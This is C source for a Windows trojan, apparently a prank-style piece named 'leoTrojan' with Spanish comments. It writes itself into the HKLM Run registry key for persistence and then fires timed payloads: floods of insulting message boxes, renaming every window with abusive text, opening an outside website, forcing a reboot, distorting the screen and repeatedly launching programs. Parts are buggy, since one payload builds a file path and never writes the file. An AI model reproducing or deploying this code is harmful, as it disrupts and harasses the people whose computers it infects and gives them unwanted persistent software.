#include <windows.h>
#include "wincrypt.h"
#include <windows.h>
#include <shlobj.h>
#include <winuser.h>

#define PAYLOAD_DELAY 10000
#define INTERVALO 10000

int estaEncendido;

const char* programas[] = 
{
    "notepad.exe", "calc.exe", "mspaint.exe", "cmd.exe", "mmc.exe"
};

int tamañoPrograma = 5;

// FUNCIONES ÚTILES

LPSTR directorioEscritorio()
{
    static wchar_t dir[MAX_PATH + 1];

    if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, dir)))
        return dir;
    else
        return "> ERROR";
}

HCRYPTPROV Prov;

int Aleatorio()
{

    if (Prov == NULL)
        if (!CryptAcquireContext(&Prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
            ExitProcess(1);
    
    int Salida;

    CryptGenRandom(Prov, sizeof(Salida), (BYTE *)(&Salida));

    return Salida & 0x7ffffff;
}

LRESULT CALLBACK MsgBoxHook(int nCodigo, WPARAM wParametro, LPARAM lParametro)
{
    if (nCodigo == HCBT_CREATEWND) {
        CREATESTRUCT *pcs = ((CBT_CREATEWND *) lParametro) -> lpcs;

        if ((pcs -> style & WS_DLGFRAME) || (pcs -> style & WS_POPUP))
        {
            HWND hwnd = (HWND) wParametro;

            int x = random() % (GetSystemMetrics(SM_CXSCREEN) - pcs -> cx);
            int y = random() % (GetSystemMetrics(SM_CYSCREEN) - pcs -> cy);

            pcs -> x = x;
            pcs -> y = y;


        }
    }
    return CallNextHookEx(0, nCodigo, wParametro, lParametro);
}

void crearArchivo(char* nombre)
{
    const wchar_t mensaje[] = L"WOOOO!";
    DWORD contadorDW, dwTemporal;
    HANDLE manejoArchivo = CreateFile(nombre, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (INVALID_HANDLE_VALUE == manejoArchivo)
    {
        return;
    }

    WriteFile(manejoArchivo, mensaje, sizeof(mensaje), &dwTemporal, NULL);
    CloseHandle(manejoArchivo);

}

BOOL EnumerarProcesosWindows(HWND hwnd, LPARAM LParam)
{
    SetWindowText(hwnd, "APESTAS APESTAS APESTAS IDIOTA IDIOTA INÚTIL FUISTE HACKEADO ESTUPIDO DE MIERDA");
    return TRUE;
}

// Con esta función hacemos un proceso para autoarrancar el malware dentro del SO de la victima.

void AutoArrancarse()
{
    TCHAR directorio[MAX_PATH];
    GetModuleFileName(NULL, directorio, MAX_PATH);
    HKEY nuevoValor;
    RegOpenKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &nuevoValor);
    RegSetValueEx(nuevoValor, "leoTrojan", 0, REG_SZ, (LPBYTE) directorio, sizeof(directorio));
    RegCloseKey(nuevoValor);
}

// Sección de payloads :D

DWORD WINAPI primeraPayload(LPVOID parametro)
{
    HHOOK hook = SetWindowsHookEx(WH_CBT, MsgBoxHook, 0, GetCurrentThreadId());
    MessageBoxW(NULL, L"LOL", L"Te estan hackeando estúpido", MB_SYSTEMMODAL | MB_OK | MB_ICONWARNING);
    UnhookWindowsHookEx(hook);
}

void segundaPayload(int n)
{
    wchar_t* escritorio = directorioEscritorio();
    wchar_t dir[MAX_PATH + 1] = { 0 };
    sprintf(dir, "%s\\Trojan_%d.txt", escritorio, n);
}

void terceraPayload() 
{
    EnumWindows(EnumerarProcesosWindows, NULL);
}

void cuartaPayload()
{
    ShellExecute(NULL, "open", "https://bonzi.link/", NULL, NULL, SW_SHOWNORMAL);
}

void quintaPayload()
{
    ShellExecute(NULL, "open", "shutdown", "-r -t 60 -c \"Es hora de irse a la mierda\"", NULL, SW_SHOWNORMAL);
}

void sextaPayload()
{
    HWND hwnd = GetDesktopWindow();
    HDC hdc = GetWindowDC(hwnd);
    RECT rect;
    GetWindowRect(hwnd, &rect);

    int ancho = rect.right - rect.left;
    int altura = rect.bottom - rect.top;

    StretchBlt(hdc, 50, 50, ancho - 100, altura - 100, hdc, 0, 0, ancho, altura, SRCCOPY);
}

void payloadFinal()
{
    for (int i = 0; i < 10; i++)
    {
        ShellExecute(NULL, "open", programas[random() % tamañoPrograma], NULL, NULL, SW_SHOWNORMAL);
    }
}

int main(int argc, char* argv[])
{
    MessageBoxA(NULL, "JAJAJA IDIOTA IDIOTA JAJAJAJAJJAAJJAJAJAAJ", "by le01q", MB_OK | MB_ICONEXCLAMATION);

    estaEncendido = 1;

    AutoArrancarse();

    while (estaEncendido == 1)
    {
        SYSTEMTIME tiempoSistema;
        GetLocalTime(&tiempoSistema);

        // Cargamos las payloads xD
        WORD minutos = tiempoSistema.wMinute;
        WORD horas = tiempoSistema.wHour;
        WORD segundos = tiempoSistema.wSecond;

        if (minutos == 0 && horas == 11 && segundos <= 20)
        {
            for (int i = 0; i < 50; i++)
            {
                CreateThread(NULL, 0, &primeraPayload, NULL, NULL, NULL);
                Sleep(50);
            }
            Sleep(PAYLOAD_DELAY);
        } 
        else if (minutos == 0 && horas == 12 && segundos <= 20)
        {
            for (int i = 0; i < 250; i++)
            {
                segundaPayload(i);
                Sleep(50);
            }
            ShowWindow(GetDesktopWindow(), SW_SHOWNORMAL);
            Sleep(PAYLOAD_DELAY);
        }
        else if (minutos == 37 && horas == 13 && segundos <= 20)
        {
            cuartaPayload();
        }
        else if (minutos == 0 && horas == 14 && segundos <= 20)
        {
            quintaPayload();
        }
        else if (minutos == 30 && horas == 14)
        {
            for (int i = 0; i < 20; i++)
            {
                sextaPayload();
                Sleep(50);
            }
        }
        if (minutos == 59 && segundos <= 20)
        {
            payloadFinal();
            Sleep(PAYLOAD_DELAY);
        }
        Sleep(INTERVALO);
    }
    return 0;
}